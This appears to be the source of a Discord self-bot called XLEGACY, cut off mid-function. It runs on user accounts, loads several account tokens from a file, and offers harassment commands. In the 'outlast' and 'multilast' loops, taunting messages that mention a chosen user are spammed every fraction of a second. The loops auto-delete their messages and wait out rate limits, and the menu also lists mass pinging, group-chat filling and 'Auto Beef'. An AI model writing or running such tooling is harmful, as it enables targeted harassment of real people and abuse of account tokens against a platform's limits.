

import discord
import platform
import aiofiles
from discord.ext import commands
import asyncio
import random
import aiohttp
import shutil
from discord.ext import commands, tasks
import sys
import os
from discord.ext import commands
import json
import colorama
colorama.init()
import json
import os
import re
import base64
import nacl
import subprocess
import requests
import io
import timedelta
import time
from itertools import islice
from datetime import datetime

# Add these with your other global variables at the top
current_theme = "red"  # Default theme
themes = {
    "red": {
        "primary": "\033[31m",      # red
        "secondary": "\033[91m",    # light_red  
        "accent": "\033[30m",       # black
        "name": "Red Theme"
    },
    "green": {
        "primary": "\033[32m",      # green
        "secondary": "\033[92m",    # light_green
        "accent": "\033[30m",       # black
        "name": "Green Theme"
    },
    "purple": {
        "primary": "\033[35m",      # magenta/purple
        "secondary": "\033[95m",    # light_magenta
        "accent": "\033[30m",       # black
        "name": "Purple Theme"
    },
    "blue": {
        "primary": "\033[34m",      # blue
        "secondary": "\033[94m",    # light_blue
        "accent": "\033[30m",       # black
        "name": "Blue Theme"
    },
    "cyan": {
        "primary": "\033[36m",      # cyan
        "secondary": "\033[96m",    # light_cyan
        "accent": "\033[30m",       # black
        "name": "Cyan Theme"
    }
}



import warnings
warnings.simplefilter("ignore", SyntaxWarning)

CONFIG_FILE_PATH = "multicast_config.json"

def time_since(dt):
    """
    Return a human-readable relative time string like '3 days ago' for a datetime.
    Handles both naive and timezone-aware datetimes.
    """
    now = datetime.utcnow()
    # If the datetime is timezone-aware, align 'now' to same tzinfo for accurate delta
    if getattr(dt, "tzinfo", None) is not None:
        try:
            now = datetime.now(dt.tzinfo)
        except Exception:
            now = datetime.utcnow()
    delta = now - dt
    seconds = int(delta.total_seconds())

    periods = [
        ('year', 60 * 60 * 24 * 365),
        ('month', 60 * 60 * 24 * 30),
        ('day', 60 * 60 * 24),
        ('hour', 60 * 60),
        ('minute', 60),
        ('second', 1),
    ]

    for name, count in periods:
        value = seconds // count
        if value:
            return f"{value} {name}{'s' if value != 1 else ''} ago"

    return "just now"

def load_multicast_config():
    if os.path.exists(CONFIG_FILE_PATH):
        with open(CONFIG_FILE_PATH, "r") as file:
            try:
                config = json.load(file)
                return config
            except json.JSONDecodeError:
                print("Error: JSON file is empty or invalid.")
                return {}
    else:
        print("Config file not found.")
        return {}

multi_tokens = []
gc_tasks = {}
manual_message_ids = set()
kill_tasks = {}
autoreply_tasks = {}
arm_tasks = {}
outlast_tasks = {}
outlast_running = False
multilast_running = False
multilast_tasks = {}
status_changing_task = None
bold_mode = False
cord_user = False
cord_mode = False
autopress_messages = {}
autopress_status = {}
autoreact_users = {}
dreact_users = {} 
autokill_messages = {}
autokill_status = {}



black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
reset = "\033[0m"  
pink = "\033[38;2;255;192;203m"
white = "\033[37m"
blue = "\033[34m"
black = "\033[30m"
light_green = "\033[92m" 
light_yellow = "\033[93m" 
light_magenta = "\033[95m" 
light_cyan = "\033[96m"  
light_red = "\033[91m"  
light_blue = "\033[94m"  
accent_color = "\033[91m"

# Add these with your other global variables at the top
PREFIX_CONFIG_FILE = "prefix_config.json"

# Load prefix from config file or use default
def load_prefix():
    """Load prefix from config file or return default"""
    try:
        if os.path.exists(PREFIX_CONFIG_FILE):
            with open(PREFIX_CONFIG_FILE, 'r') as f:
                config = json.load(f)
                return config.get("prefix", ".")
        else:
            # Create default config
            save_prefix(".")
            return "."
    except:
        return "."

def save_prefix(new_prefix):
    """Save prefix to config file"""
    try:
        with open(PREFIX_CONFIG_FILE, 'w') as f:
            json.dump({"prefix": new_prefix}, f)
        return True
    except:
        return False

# Initialize prefix
PREFIX = load_prefix()

# Update bot command prefix
bot = commands.Bot(command_prefix=PREFIX, self_bot=True)

# Add these with your other global variables at the top
HOST_CONFIG_FILE = "host_config.json"
hosted_users = {}
host_clients = {}
# Add these with your other global variables at the top
HOST_CONFIG_FILE = "host_config.json"
hosted_users = {}
host_clients = {}
hosted_command_handlers = {}


def save_hosted_users():
    """Save hosted users mapping to HOST_CONFIG_FILE."""
    try:
        with open(HOST_CONFIG_FILE, 'w') as f:
            json.dump(hosted_users, f, indent=2)
        return True
    except Exception as e:
        try:
            print(f"{theme_primary}Error saving host config: {e}{reset}")
        except Exception:
            print("Error saving host config: ", e)
        return False


def load_hosted_users():
    """Load hosted users from HOST_CONFIG_FILE."""
    global hosted_users
    try:
        if os.path.exists(HOST_CONFIG_FILE):
            with open(HOST_CONFIG_FILE, 'r') as f:
                hosted_users = json.load(f)
        else:
            hosted_users = {}
            save_hosted_users()
    except Exception as e:
        try:
            print(f"{theme_primary}Error loading host config: {e}{reset}")
        except Exception:
            print("Error loading host config: ", e)
        hosted_users = {}


# Load hosted users on startup
load_hosted_users()


@bot.group(name='host', invoke_without_command=True)
async def host(ctx):
    """Host group to manage hosted users."""
    await ctx.send(f"```ansi\n{theme_primary}Host management commands:{reset}\n\n{theme_secondary}{PREFIX}host add <@user> - Add a hosted user\n{theme_secondary}{PREFIX}host remove <@user> - Remove a hosted user\n{theme_secondary}{PREFIX}host list - List hosted users{reset}\n```")


@host.command(name='add')
async def host_add(ctx, user: discord.User):
    """Add a user to the hosted list."""
    if ctx.author != bot.user:
        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can manage hosted users{reset}\n```")
        return
    try:
        hosted_users[str(user.id)] = True
        save_hosted_users()
        await ctx.send(f"```ansi\n{theme_primary}Added hosted user: {user.name} ({user.id}){reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{theme_primary}Failed to add hosted user: {e}{reset}\n```")


@host.command(name='remove')
async def host_remove(ctx, user: discord.User):
    """Remove a user from the hosted list."""
    if ctx.author != bot.user:
        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can manage hosted users{reset}\n```")
        return
    try:
        if str(user.id) in hosted_users:
            del hosted_users[str(user.id)]
            save_hosted_users()
            await ctx.send(f"```ansi\n{theme_primary}Removed hosted user: {user.name} ({user.id}){reset}\n```")
        else:
            await ctx.send(f"```ansi\n{theme_primary}User is not hosted: {user.name}{reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{theme_primary}Failed to remove hosted user: {e}{reset}\n```")


@host.command(name='list')
async def host_list(ctx):
    """List all hosted users."""
    if ctx.author != bot.user:
        await ctx.send(f"```ansi\n{theme_primary}Unauthorized - only the host owner can list hosted users{reset}\n```")
        return
    try:
        if not hosted_users:
            await ctx.send(f"```ansi\n{theme_primary}No hosted users configured{reset}\n```")
            return
        lines = []
        for uid in list(hosted_users.keys()):
            try:
                u = await bot.fetch_user(int(uid))
                lines.append(f"{u.name} ({uid})")
            except Exception:
                lines.append(f"Unknown User ({uid})")
        await ctx.send(f"```ansi\n{theme_primary}Hosted users:\n\n{theme_secondary}" + "\n".join(lines) + f"{reset}\n```")
    except Exception as e:
        await ctx.send(f"```ansi\n{theme_primary}Failed to list hosted users: {e}{reset}\n```")

# Load tokens from file
def load_tokens():
    try:
        with open('token.txt', 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        return tokens
    except FileNotFoundError:
        return []

# Load multilast config
CONFIG_FILE_PATH = "multilast_config.json"
default_multilast_config = {
    "token_count": None,  
    "delay": 0.003        
}
# Load outlast messages from file - SIMPLER VERSION
def load_outlast_messages():
    try:
        # Just use the filename if it's in the same directory as your script
        with open('outlast_messages.txt', 'r', encoding='utf-8') as f:
            messages = [line.strip() for line in f if line.strip()]
        print(f"Loaded {len(messages)} outlast messages from file")
        return messages
    except FileNotFoundError:
        print("Outlast messages file not found in current directory")
        # Try creating a default file
        try:
            default_messages = ["You can't escape me", "I'll always be here", "Still watching you", "I'm not going anywhere"]
            with open('outlast_messages.txt', 'w', encoding='utf-8') as f:
                for msg in default_messages:
                    f.write(msg + '\n')
            print("Created default outlast_messages.txt file")
            return default_messages
        except Exception as e:
            print(f"Could not create file: {e}")
            return default_messages
        except Exception as e:
            print(f"Error loading outlast messages: {e}")
            return ["Error loading messages"]
@bot.event
async def on_ready():
    import shutil
    
    # Get terminal width for centering
    terminal_width = shutil.get_terminal_size().columns
    
    # Use theme colors
    yyy = theme_primary  # Main text color
    mkk = theme_accent   # Box color
    www = reset          # Reset color
    
    # Banner text - FIXED ESCAPE SEQUENCES
    banner_lines = [
    f"{yyy}___  _ _     _____ _____ ____  ____ ___  _{www}",
    f"{yyy}\\  \\/// \\   /  __//  __//  _ \\/   _\\\\  \\//{www}",
    f"{yyy} \\  / | |   |  \\  | |  _| / \\||  /   \\  / {www}",
    f"{yyy} /  \\ | |_/\\|  /_ | |_//| |-|||  \\__ / /  {www}",
    f"{yyy}/__/\\\\\\____/\\____\\\\____\\\\_/ \\|\\____//_/   {www}",
    f"{mkk}╔═════════════════════════════════════╗{www}",
    f"{mkk}║           {yyy}XLEGACY SELFBOT{mkk}             ║{www}",
    f"{mkk}║          {yyy}By @unholxy{mkk}                 ║{www}",
    f"{mkk}╚═════════════════════════════════════╝{www}"
]
    
    # Bot info box
    border_line = "═" * 37
    bot_user = f"User: {bot.user.name}".ljust(36)
    bot_prefix = f"Prefix: {PREFIX}".ljust(36)
    version = f"Version: V.1".ljust(36)
    server_count = f"Servers: {len(bot.guilds)}".ljust(36)
    friend_count = f"Friends: {len([f for f in bot.user.friends])}".ljust(36)
    token_count = f"Tokens: {len(load_tokens())}".ljust(36)
    hosted_count = f"Hosted: {len(hosted_users)}".ljust(36)
    theme_info = f"Theme: {themes[current_theme]['name']}".ljust(36)
    
    info_box = [
        f"{yyy}╔{border_line}╗{www}",
        f"{yyy}║ {bot_user} {yyy}║{www}",
        f"{yyy}║ {bot_prefix} {yyy}║{www}",
        f"{yyy}║ {version} {yyy}║{www}",
        f"{yyy}║ {server_count} {yyy}║{www}",
        f"{yyy}║ {friend_count} {yyy}║{www}",
        f"{yyy}║ {token_count} {yyy}║{www}",
        f"{yyy}║ {hosted_count} {yyy}║{www}",
        f"{yyy}║ {theme_info} {yyy}║{www}",
        f"{yyy}╚{border_line}╝{www}"
    ]
    
    # Spider ASCII art
    spider_art = [
        "⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⣼⠃⠀⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠸⣧⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⣸⡇⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⢰⡿⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢿⡆⠀⠀⠀⠀",
        "⠀⠀⠀⢀⣾⡇⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⢸⣿⡀⠀⠀⠀",
        "⠀⠀⠀⢸⣿⠁⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠈⣿⣇⠀⠀⠀",
        "⠀⠀⢀⣿⡟⠀⠀⢿⣿⣶⠶⠶⠶⠶⢾⣦⡀⡴⢀⣀⣦⢀⣴⡷⠶⠶⠶⠶⣶⣿⡿⠀⠀⢹⣿⡀⠀⠀",
        "⠀⠀⢸⣿⡇⠀⠀⣀⣉⣤⣴⣶⣶⣶⣶⣽⣿⣿⣿⣿⣿⣿⣯⣶⣶⣶⣶⣦⣤⣉⣀⠀⠀⢸⣿⡇⠀⠀",
        "⠀⠀⠸⢿⣷⣶⠿⠟⠋⠉⠀⣠⣄⣤⣭⣿⣿⣿⣿⣿⣿⡿⣿⣭⣥⣠⣄⠀⠉⠉⠻⠿⣷⣾⡿⠇⠀⠀",
        "⠀⠀⠀⠀⠉⠁⠀⠀⢀⣠⣾⡿⠟⢋⣹⣿⢿⣿⣿⣿⣿⡿⣿⣯⡙⠻⠿⣷⣄⡀⠀⠀⠈⠉⠁⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⢀⣴⠾⠋⠁⣠⣴⡾⠋⠁⣾⣿⣿⣿⣿⣷⠈⠙⢿⣦⣄⠈⠙⠷⣦⡀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⢀⣠⣶⠟⠁⠀⠀⠀⣿⣿⠁⠀⢰⣿⣿⣿⣿⣿⣿⡆⠀⠈⣿⣿⠀⠀⠀⠉⠻⣶⣄⡀⠀⠀⠀",
        "⢰⣤⣶⣿⠟⠁⠀⠀⠀⠀⠀⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⠀⠀⠀⠀⠀⠈⠻⣿⣶⣤⡆",
        "⢸⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡇",
        "⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀",
        "⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀",
        "⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀",
        "⠀⠈⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀",
        "⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠘⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⠇⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⠀",
        "⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀",
        "⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀",
        "⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    ]
    
    # Combine all lines - banner and info box first
    all_lines = banner_lines + [""] + info_box + [""] + [""]
    
    # Center and print the banner and info box
    for line in all_lines:
        clean_line = line.replace(yyy, "").replace(mkk, "").replace(www, "")
        padding = (terminal_width - len(clean_line)) // 2
        centered_line = " " * padding + line
        print(centered_line)
    
    # Print spider art at the bottom (centered)
    print("\n" * 2)  # Add some space
    for line in spider_art:
        centered_line = line.center(terminal_width)
        print(f"{theme_primary}{centered_line}{reset}")

    # STARTING THE BOT
    print(f"\n{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")
    print(f"{theme_primary} XLEGACY SELFBOT READY | PREFIX: {PREFIX} | THEME: {themes[current_theme]['name']} {reset}")
    print(f"{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")
    print(f"{theme_secondary}Loaded {theme_primary}{len(load_tokens())}{theme_secondary} tokens from token.txt{reset}")
    print(f"{theme_secondary}Loaded {theme_primary}{len(hosted_users)}{theme_secondary} hosted users from host_config.json{reset}")
    print(f"{theme_secondary}Type {theme_primary}{PREFIX}menu{theme_secondary} to see available commands{reset}")
    print(f"{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}")

    
@bot.command()
async def menu(ctx):
    await ctx.send(f"""```ansi
       
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────Selfbot─────────────────────────{red}

          ⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⠃⠀⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠸⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⡇⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡿⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢿⡆⠀⠀⠀⠀
⠀⠀⠀⢀⣾⡇⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⢸⣿⡀⠀⠀⠀
⠀⠀⠀⢸⣿⠁⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠈⣿⣇⠀⠀⠀
⠀⠀⢀⣿⡟⠀⠀⢿⣿⣶⠶⠶⠶⠶⢾⣦⡀⡴⢀⣀⣦⢀⣴⡷⠶⠶⠶⠶⣶⣿⡿⠀⠀⢹⣿⡀⠀⠀
⠀⠀⢸⣿⡇⠀⠀⣀⣉⣤⣴⣶⣶⣶⣶⣽⣿⣿⣿⣿⣿⣿⣯⣶⣶⣶⣶⣦⣤⣉⣀⠀⠀⢸⣿⡇⠀⠀
⠀⠀⠸⢿⣷⣶⠿⠟⠋⠉⠀⣠⣄⣤⣭⣿⣿⣿⣿⣿⣿⡿⣿⣭⣥⣠⣄⠀⠉⠉⠻⠿⣷⣾⡿⠇⠀⠀
⠀⠀⠀⠀⠉⠁⠀⠀⢀⣠⣾⡿⠟⢋⣹⣿⢿⣿⣿⣿⣿⡿⣿⣯⡙⠻⠿⣷⣄⡀⠀⠀⠈⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⠾⠋⠁⣠⣴⡾⠋⠁⣾⣿⣿⣿⣿⣷⠈⠙⢿⣦⣄⠈⠙⠷⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⠟⠁⠀⠀⠀⣿⣿⠁⠀⢰⣿⣿⣿⣿⣿⣿⡆⠀⠈⣿⣿⠀⠀⠀⠉⠻⣶⣄⡀⠀⠀⠀
⢰⣤⣶⣿⠟⠁⠀⠀⠀⠀⠀⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⠀⠀⠀⠀⠀⠈⠻⣿⣶⣤⡆
⢸⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⢸⣿⣿⣿⣿⡏⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡇
⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠀
⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀
⠀⠈⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀
⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠘⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⠇⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀
⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀
⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

{light_red}[ {light_red}.main {light_red}] {red}Multi Main	{black}[ {light_red}.chatpack {black}] {red}Misc/chatpack
{black}[ {light_red}.misc {black}] {red}More Misc	{light_red}[ {light_red}.autocmd {light_red}] {red}Auto Cmds/Afk
{light_red}[ {light_red}.spotify {light_red}] {red}Spotify Control	{black}[ {light_red}.account {black}] {red}Account
{light_red}[ {light_red}.nsfw {light_red}] {red}NSFW	{black}[ {light_red}.settings {black}] {red}Settings
{light_red}[ {light_red}.ab {light_red}] {red}Auto Beef	{black}[ {light_red}.multi {black}] {red}Multi-token

    ```
""")
    
# MAIN COMMANDS

@bot.command()
async def main(ctx):
    msg = await ctx.send(f"```ansi\n{red} XLEGACY | MULTI MAIN {reset}\n```")
    help_content = fr"""
                {black}─────────────────────────────────────XLEGACY─────────────────────────
                           {red} ──────────────────── XLEGACY |  MADE BY @unholxy {light_red} V.1 ────────────────────
                {black}─────────────────────────────────────Selfbot─────────────────────────{red}
 
{red}Multi Token Management{reset}
{light_red}[ {red}1{light_red} ] {black}outlast <@user>    {light_red}[ {red}2{light_red} ] {black}stopoutlast        {light_red}[ {red}3{light_red} ] {black}multilast <@user> 
{light_red}[ {red}4{light_red} ] {black}stopmultilast      {light_red}[ {red}5{light_red} ] {black}tok                {light_red}[ {red}6{light_red} ] {black}multivc

{red}Auto Response{reset}
{light_red}[ {red}7{light_red} ] {black}ar <@user>         {light_red}[ {red}8{light_red} ] {black}arend              {light_red}[ {red}9{light_red} ] {black}arm <@user>
{light_red}[ {red}10{light_red} ] {black}armend            {light_red}[ {red}11{light_red} ] {black}kill <@user>       {light_red}[ {red}12{light_red} ] {black}killend

{red}Spam & Control{reset}
{light_red}[ {red}13{light_red} ] {black}gcfill            {light_red}[ {red}14{light_red} ] {black}gc                {light_red}[ {red}15{light_red} ] {black}gcend
{light_red}[ {red}16{light_red} ] {black}mping             {light_red}[ {red}17{light_red} ] {black}mpingoff          {light_red}[ {red}18{light_red} ] {black}invis
{light_red}[ {red}19{light_red} ] {black}invisoff          {light_red}[ {red}20{light_red} ] {black}popout            {light_red}[ {red}21{light_red} ] {black}bold

{red}Message Formatting{reset}
{light_red}[ {red}22{light_red} ] {black}unbold            {light_red}[ {red}23{light_red} ] {black}cord              {light_red}[ {red}24{light_red} ] {black}cordoff
{light_red}[ {red}25{light_red} ] {black}translate <lang>  {light_red}[ {red}26{light_red} ] {black}translateoff      {light_red}[ {red}27{light_red} ] {black}mreact

{red}Reactions & Status{reset}
{light_red}[ {red}28{light_red} ] {black}reactoff          {light_red}[ {red}29{light_red} ] {black}autoreact         {light_red}[ {red}30{light_red} ] {black}autoreactoff
{light_red}[ {red}31{light_red} ] {black}rpcall            {light_red}[ {red}32{light_red} ] {black}stoprpc           {light_red}[ {red}33{light_red} ] {black}inviteinfo <code>
⠀⠀
"""
    await msg.edit(content=f"```ansi\n{help_content}\n```")

# OUTLAST COMMANDS
@bot.command()
async def outlast(ctx, user: discord.User):
    global outlast_running, outlast_messages
    
    # Reload messages from file each time command is run to get latest content
    outlast_messages = load_outlast_messages()
    
    if not outlast_messages:
        await ctx.send("```No messages found in outlast_messages.txt file```")
        return
    
    counter = 1

    if outlast_running:
        await ctx.send("```An outlast session is already running```")
        return
        
    outlast_running = True

    async def outlast_loop():
        nonlocal counter
        consecutive_failures = 0
        max_consecutive_failures = 5
        
        while outlast_running:
            try:
                message = random.choice(outlast_messages)
                try:
                    # Send message and store it for deletion
                    sent_message = await ctx.send(f"{user.mention} {message}\n```{counter}```")
                    counter += 1
                    consecutive_failures = 0  
                    
                    # Schedule message deletion after 20 seconds
                    async def delete_after_delay(msg):
                        await asyncio.sleep(20)
                        try:
                            await msg.delete()
                        except:
                            pass  # Message might already be deleted
                    
                    # Start deletion task
                    bot.loop.create_task(delete_after_delay(sent_message))
                    
                    await asyncio.sleep(0.66)  
                    
                except discord.errors.HTTPException as e:
                    if e.status == 429:  
                        retry_after = e.retry_after
                        print(f"Rate limited, waiting {retry_after} seconds...")
                        await asyncio.sleep(retry_after + 0.5)  
                    else:
                        consecutive_failures += 1
                        print(f"HTTP Error: {e}")
                        await asyncio.sleep(1)
                        
                except Exception as e:
                    consecutive_failures += 1
                    print(f"Error sending message: {e}")
                    await asyncio.sleep(1)
                    
                if consecutive_failures >= max_consecutive_failures:
                    print("Too many consecutive failures, stopping outlast")
                    outlast_running = False
                    await ctx.send("```Outlast stopped due to too many errors```")
                    break
                    
            except Exception as e:
                print(f"Error in outlast loop: {e}")
                await asyncio.sleep(1)
                continue

    try:
        task = bot.loop.create_task(outlast_loop())
        outlast_tasks[(user.id, ctx.channel.id)] = task
        await ctx.send(f"```ansi\n{red} XLEGACY | OUTLAST STARTED | DONT FOLD {reset}\n```")
    except Exception as e:
        outlast_running = False
        print(f"Failed to start outlast: {e}")
        await ctx.send("```Failed to start outlast```")

@bot.command()
async def stopoutlast(ctx):
    global outlast_running
    if outlast_running:
        outlast_running = False
        channel_id = ctx.channel.id
        tasks_to_stop = [key for key in outlast_tasks.keys() if key[1] == channel_id]
        
        for task_key in tasks_to_stop:
            task = outlast_tasks.pop(task_key)
            task.cancel()
            
        await ctx.send("```The outlast session has been stopped```")
    else:
        await ctx.send("```No outlast session is currently running```")

# MULTILAST COMMANDS
@bot.command()
async def multilast(ctx, user: discord.User):
    global multilast_running, tokens, multilast_config
    
    if multilast_running:
        await ctx.send("```A multilast session is already running```")
        return
        
    multilast_running = True
    
    # Get token settings
    token_count = multilast_config.get("token_count")
    delay = multilast_config.get("delay", 0.003)
    
    if token_count is None:
        token_count = len(tokens)
    
    selected_tokens = tokens[:token_count]
    
    if not selected_tokens:
        await ctx.send("```No tokens available in token.txt```")
        multilast_running = False
        return

    async def multilast_loop():
        counter = 1
        consecutive_failures = 0
        max_consecutive_failures = 5
        
        while multilast_running:
            try:
                message = random.choice(outlast_messages)
                try:
                    await ctx.send(f"{user.mention} {message}\n```{counter} (Multi)```")
                    counter += 1
                    consecutive_failures = 0  
                    await asyncio.sleep(delay)  
                    
                except discord.errors.HTTPException as e:
                    if e.status == 429:  
                        retry_after = e.retry_after
                        print(f"Rate limited, waiting {retry_after} seconds...")
                        await asyncio.sleep(retry_after + 0.5)  
                    else:
                        consecutive_failures += 1
                        print(f"HTTP Error: {e}")
                        await asyncio.sleep(1)
                        
                except Exception as e:
                    consecutive_failures += 1
                    print(f"Error sending message: {e}")
                    await asyncio.sleep(1)
                    
                if consecutive_failures >= max_consecutive_failures:
